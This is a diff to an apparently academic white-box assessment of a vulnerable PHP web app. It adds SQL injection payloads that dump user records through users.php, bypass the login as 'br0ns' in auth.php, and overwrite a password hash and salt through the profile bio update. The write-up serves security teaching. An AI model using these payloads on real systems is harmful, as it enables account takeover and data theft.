@@ -35,7 +35,7 @@ Part 2: White Box Assessment
 
 ## List of users
 
-We will use some simple SQL injection to get what we want. This is done by inputting the following command in the `user.php` search field:
+We will use some simple SQL injection to get what we want. This is done by inputting the following command in the `users.php` search field:
 
 	'
 	UNION ALL
@@ -46,7 +46,7 @@ We will use some simple SQL injection to get what we want. This is done by input
 	FROM Person
 	WHERE '1'='1
 
-Because the SQL statepemt is written in plain text like so:
+Because the SQL statement is written in plain text like so:
 
 	```php
 	$selecteduser = $_GET['user'];
@@ -71,3 +71,44 @@ This will retreive everything we want to know about the users currently in the d
 
 
 ## Change password of br0ns
+
+In the `auth.php` file the login is checked by building the function `_checkLogin` with the following plain text SQL query:
+	
+	$sql = "SELECT * FROM Person WHERE " .
+           "Username = '$username' AND " .
+           "Password = '$hashedpassword'";
+
+We can use here an SQL injection to login as br0ns, like so:
+
+	In the username field:
+		br0ns' OR '1'='1
+	In the password field: 
+		(anything we want)
+
+This will create the following SQL statement:
+
+	$sql = "SELECT * FROM Person WHERE " .
+			"Username = 'br0ns' OR '1'='1' AND " .
+			"Password = '(anything we want)'";
+
+The following command will successed because the AND binds stronger than OR. It will find the $username and will not check if the passsword is correct.
+Another thing to point out is that the stored password in the database is hashed by an applying an md5sum on the password concatenated with a salt:
+
+	$hashedpassword = md5($password.$salt);
+
+So in order to change the password we must think of a password and salt combination and hash it in the terminal like so:
+
+	echo -n "(password)(salt)" | md5sum
+
+The `-n` option is there so we don't include the newline character in our md5sum. After we retrieve our hashed password we have to save it in the database, along with the salt. The only way I found out how to save something to the profile is by updating our profile bio in `index.php`. Here we can see that the profile update is done by accessing a _POST variable directly in a SQL statement.
+
+	$sql = "UPDATE Person SET Profile='$profile' ".
+           "WHERE PersonID=$user->id";
+
+We use the $profile variable to inject our SQL command like so: (BTW the password is `hello`)
+	
+	$sql = "UPDATE Person SET Profile='So bad', Password='78ce5a134ac019f1f453f1c501677376', Salt='here' ".
+           "WHERE PersonID=$user->id";
+
+
+
